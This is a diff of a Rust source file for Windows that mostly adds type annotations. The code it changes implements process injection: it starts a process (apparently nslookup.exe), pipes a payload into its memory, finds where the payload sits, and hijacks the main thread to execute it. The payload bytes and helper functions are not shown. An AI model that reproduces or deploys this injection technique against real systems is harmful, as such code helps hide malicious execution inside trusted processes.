@@ -1,9 +1,9 @@
 mod utils;
 
-use std::ffi::{c_void};
+use std::ffi::{c_void,CString};
 use std::{ptr,thread,time::Duration};
 
-use crate::utils::{MemoryInfo, get_args, create_pipe,change_protect, find_offset, hijack_main_thread};
+use crate::utils::{Handle,MemoryInfo, get_args, create_pipe,change_protect, find_offset, hijack_main_thread};
 
 use windows::core::{PSTR,PCSTR};
 use windows::Win32::System::IO::{OVERLAPPED};
@@ -15,15 +15,15 @@ use windows::Win32::System::Threading::{CREATE_NEW_CONSOLE, NORMAL_PRIORITY_CLAS
 fn main() {
     
     // get path to executable
-    let result  = get_args().unwrap();
-    let path = result.as_ptr() as *mut u8;
+    let result: CString  = get_args().unwrap();
+    let path: *mut u8 = result.as_ptr() as *mut u8;
     let cmd_line: PSTR = PSTR::from_raw(path); 
 
     // get handle of hStdInput / hStdOuput
-    let my_handle = create_pipe();
+    let my_handle: Handle = create_pipe();
 
     // fill startup info
-    let reserved = PSTR::null();
+    let reserved: PSTR = PSTR::null();
 
     // send handler to the new created process
     let si: STARTUPINFOA = STARTUPINFOA { 
@@ -38,10 +38,10 @@ fn main() {
 
     // prepare arg for CreateProcess
     let mut pi: PROCESS_INFORMATION = PROCESS_INFORMATION {..Default::default()};
-    let app_name = PCSTR::null();
+    let app_name: PCSTR = PCSTR::null();
     let env: *const c_void = ptr::null();
-    let curr_directory = PCSTR::null();
-    let sa = Some(&my_handle.security_attr as *const SECURITY_ATTRIBUTES);
+    let curr_directory: PCSTR = PCSTR::null();
+    let sa: Option<*const SECURITY_ATTRIBUTES> = Some(&my_handle.security_attr as *const SECURITY_ATTRIBUTES);
 
 
      let result = unsafe {
@@ -98,7 +98,7 @@ fn main() {
         ];
 
     let mut byte_written: u32= 0;
-    let mut overlapped = OVERLAPPED{..Default::default()};
+    let mut overlapped :OVERLAPPED= OVERLAPPED{..Default::default()};
 
     // send payload throught pipe
     let result = unsafe {
@@ -127,10 +127,10 @@ fn main() {
     }
 
     // find where the payload is store in process memory
-    let ns_handle : HANDLE = pi.hProcess;
-    let result = find_offset(ns_handle, &buffer);
+    let ns_handle: HANDLE = pi.hProcess;
+    let result: Option<MemoryInfo> = find_offset(ns_handle, &buffer);
 
-    let mem_info = match result{   
+    let mem_info: MemoryInfo = match result{   
         Some(mem_info) => mem_info,
         None => MemoryInfo::default(),
     };
@@ -144,8 +144,8 @@ fn main() {
     hijack_main_thread(ns_thread, offset);
 
     byte_written = 0;
-    let mut overlapped = OVERLAPPED{..Default::default()};
-    let input = b"\n";
+    let mut overlapped: OVERLAPPED = OVERLAPPED{..Default::default()};
+    let input: &[u8;1] = b"\n";
     
     // this write is use to unblock the main thread of nslookup.exe
     let _ = unsafe {
